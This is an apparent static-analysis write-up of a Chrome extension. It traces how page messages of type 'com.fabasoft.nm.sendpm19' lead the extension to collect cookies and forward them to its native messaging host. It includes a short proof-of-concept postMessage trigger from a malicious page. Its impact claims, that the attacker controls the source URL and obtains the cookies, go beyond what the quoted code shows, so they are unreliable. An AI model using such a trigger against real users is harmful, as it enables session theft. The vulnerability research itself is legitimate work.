# CoCo Analysis: nofhaafhnnklcdahnbackdgpgnimcpob

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 20+ (many duplicates, all related to cookies → native messaging)

---

## Sink: cookies_source → externalNativePortpostMessage_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nofhaafhnnklcdahnbackdgpgnimcpob/opgen_generated_files/bg.js
Line 689	        name: 'cookie_name',
Line 1352	                cookiestr += (cookiestr ? "; " : "") + cookie.name + "=" + cookie.value;
```

**Code:**

```javascript
// Content script (nmext.js) - Entry point at line 114
window.addEventListener("message", function(event) {
  if (event.source != window) {
    return;
  }
  // Line 119: Check for specific message type
  if (event.data.type && (event.data.type == "com.fabasoft.nm.sendpm19")) {
    var data = event.data;
    data.srcurl = event.source.location.href; // ← attacker-controlled srcurl
    portPromise.then(function(port) {
      try {
        port.postMessage(data); // ← forward to background
      } catch(e) {
        // error handling
      }
    }).catch(function() {});
  }
}, false);

// Background script (nmextback.js) - Line 1152-1161
chrome.runtime.onConnect.addListener(function(contentport) {
  var contentportid = contentport.sender.tab.id;
  contentports[contentportid] = contentport;

  contentport.onMessage.addListener(function(data, sender) {
    // Line 1242-1250: Handle Init and UpdateLoginToken methods
    if (data.method == "Init") {
      data.alltabids = [];
      for (var id in contentports) {
        data.alltabids.push(id.toString());
      }
      postMessageWithCookies(data, contentport, contentportid); // ← get cookies
    }
    else if (data.method == "UpdateLoginToken") {
      postMessageWithCookies(data, contentport, contentportid); // ← get cookies
    }
    else {
      port.postMessage(data);
    }
  });
});

// Line 1301-1373: postMessageWithCookies function
function postMessageWithCookies(data, contentport, contentportid)
{
  try {
    chrome.cookies.getAllCookieStores(function(stores) {
      var storeid = null;
      // Find store ID for the tab
      for (var i = 0; i < stores.length; i++) {
        for (var j = 0; j < stores[i].tabIds.length; j++) {
          if (stores[i].tabIds[j] === contentportid) {
            storeid = stores[i].id;
            break;
          }
        }
        if (storeid) break;
      }

      // Line 1346-1355: Get cookies for the source URL
      chrome.cookies.getAll({url:data.srcurl, storeId:storeid}, function(cookies) {
        var cookiestr = "";
        if (cookies) {
          for (var i = 0; i < cookies.length; i++) {
            var cookie = cookies[i];
            cookiestr += (cookiestr ? "; " : "") + cookie.name + "=" + cookie.value; // ← sensitive cookies
          }
        }
        data.indata.cookies = cookiestr;

        // Line 1361: Send to native messaging host with cookies
        port.postMessage(data); // ← exfiltrate cookies to native host
      });
    });
  } catch(e) {
    handleError(e);
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Malicious webpage script
// Content script is injected on <all_urls> and listens for window messages

// Trigger cookie exfiltration for any domain
window.postMessage({
  type: "com.fabasoft.nm.sendpm19",
  method: "Init", // or "UpdateLoginToken"
  callid: "attack123",
  indata: {}
}, "*");

// The extension will:
// 1. Receive the message via content script
// 2. Forward to background with srcurl = current page URL
// 3. Background retrieves ALL cookies for that URL
// 4. Send cookies to native messaging host
// 5. Native host can exfiltrate cookies

// Attacker can also specify arbitrary srcurl by manipulating event.source.location
// or by triggering from an iframe with controlled origin
```

**Impact:** An attacker on any webpage can trigger the extension to retrieve and exfiltrate sensitive cookies to the native messaging host. The extension has content scripts on `<all_urls>` that listen for window.postMessage events with type "com.fabasoft.nm.sendpm19". When a message with method "Init" or "UpdateLoginToken" is received, the background script retrieves all cookies for the source URL and forwards them to the native messaging host via port.postMessage. The attacker controls the source URL (event.source.location.href) and can retrieve cookies for the current domain or potentially other domains by triggering the message from iframes. This enables information disclosure of sensitive authentication cookies, session tokens, and other confidential data stored in cookies. The extension has "cookies" and "<all_urls>" permissions, enabling full cookie access across all origins.
